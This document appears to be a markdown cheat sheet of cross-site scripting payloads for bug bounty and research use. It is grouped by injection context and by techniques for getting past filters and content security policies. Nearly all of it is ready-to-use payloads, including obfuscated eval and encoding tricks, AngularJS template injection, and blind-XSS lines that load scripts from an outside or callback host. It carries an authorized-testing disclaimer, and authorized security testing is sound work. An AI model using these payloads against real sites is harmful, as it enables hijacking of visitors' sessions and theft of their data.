## All XSS Payloads Should Be Tested Ethically and Only in Authorized Environments

* Bypasses often rely on **browser quirks**, **contextual placement**, or **filter evasion**.
* XSS without context is useless—understand the sink, encoding, sanitization, and injection point.

---

# 🧨 XSS Payload Cheat Sheet

> *A curated collection of XSS payloads for bug bounty and research use. Organized by context and filter bypass techniques.*
> *All payloads are **for authorized testing only**. Responsible disclosure encouraged.*

---

## 🔹 1. Basic Payloads

```html
<script>alert(1)</script>
<svg onload=alert(1)>
<iframe src="javascript:alert(1)"></iframe>
<math><mi//xlink:href="javascript:alert(1)">CLICK</math>
<IMG SRC="javascript:alert(1)">
<IMG SRC=# onerror="alert(1)">
```

---

## 🔹 2. Attribute Injection (e.g., inside `href`, `src`, etc.)

```html
"><script>alert(1)</script>
"><img src=x onerror=alert(1)>
"onmouseover="alert(1)
javascript:alert(1)
data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==
```

---

## 🔹 3. Event Handler Injection

```html
<video autoplay onloadstart=alert(1)>
<svg onmouseover=alert(1)>
<body onresize=alert(1)>
<details ontoggle=alert(1)>
<marquee onstart=alert(1)>
```

---

## 🔹 4. DOM XSS (Client-side sink exploitation)

```js
// Sinks
document.write("<img src=x onerror=alert(1)>")
location.hash = "<svg onload=alert(1)>"
document.body.innerHTML = location.hash
```

---

## 🔹 5. HTML Injection in `input` or `textarea`

```html
<textarea autofocus onfocus=alert(1)>X
<input autofocus onfocus=alert(1) type=text>
<keygen autofocus onfocus=alert(1)>
```

---

## 🔹 6. JS Context Injection

```js
');alert(1);//
";alert(1);// 
';alert(String.fromCharCode(88,83,83));// 
" style="animation-name:x" onanimationstart=alert(1)
```

---

## 🔹 7. SVG & XML-based Payloads

```html
<svg><desc><![CDATA[</desc><script>alert(1)</script>]]></svg>
<svg><foreignObject><body xmlns="http://www.w3.org/1999/xhtml" onload="alert(1)"></body></foreignObject></svg>
```

---

## 🔹 8. Polyglot Payloads

```html
"><svg/onload=alert(1)>"
</script><svg/onload=alert(1)>//
"><script src=//xss.rocks/xss.js></script>
<iframe/src="data:text/html,<script>alert(1)</script>">
```

---

## 🔹 9. CSP Bypass Examples

```html
<script src='data:text/javascript,alert(1)'></script>
<img src=x onerror="eval(String.fromCharCode(97,108,101,114,116,40,49,41))">
<svg><script xlink:href="data:text/javascript,alert(1)"></script></svg>
```

---

## 🔹 10. Advanced JS URI + UTF-7/8/Obfuscation

```html
<a href="javas&#99;ript:alert(1)">X</a>
<svg><script>eval('\u0061\u006c\u0065\u0072\u0074\u0028\u0031\u0029')</script></svg>
<script>eval(atob("YWxlcnQoMSk="))</script>
```

---

## 🔹 11. Inline JavaScript with `setTimeout`, `Function`, etc.

```html
<img src=x onerror="setTimeout`alert\x281\x29`">
<img src=x onerror="(new Function`alert(1)`)()">
<svg><script>top </script></svg>
```

---

## 🔹 12. Framework-Specific Tricks

### React / Angular / Vue:

```jsx
// React JSX
dangerouslySetInnerHTML={{__html: '<img src=x onerror=alert(1)>'}}

// AngularJS Template Injection
{{constructor.constructor('alert(1)')()}}

// Vue XSS via {{ }}
<div>{{alert(1)}}</div>
```

---

## 🔹 13. Input Encoding and Filter Bypass

```html
<svg o%6e%6c%6f%61%64=alert(1)>
<IMG SRC=JaVaScRiPt:alert(1)>
<svg><script>eval/*x*/(String.fromCharCode(97,108,101,114,116,40,49,41))</script></svg>
```

---

## 🔹 14. File Upload (if HTML/JS is accepted)

```html
// test.svg
<svg xmlns="http://www.w3.org/2000/svg" onload="alert(1)"/>

// test.html
<html><body><script>alert(1)</script></body></html>
```

---

## 🔹 15. Blind XSS for Collaboration Tools or Admin Panels

```html
<script src=//yourdomain.burpcollaborator.net></script>
<img src=//yourdomain.oast.live onerror=alert(1)>
```

---
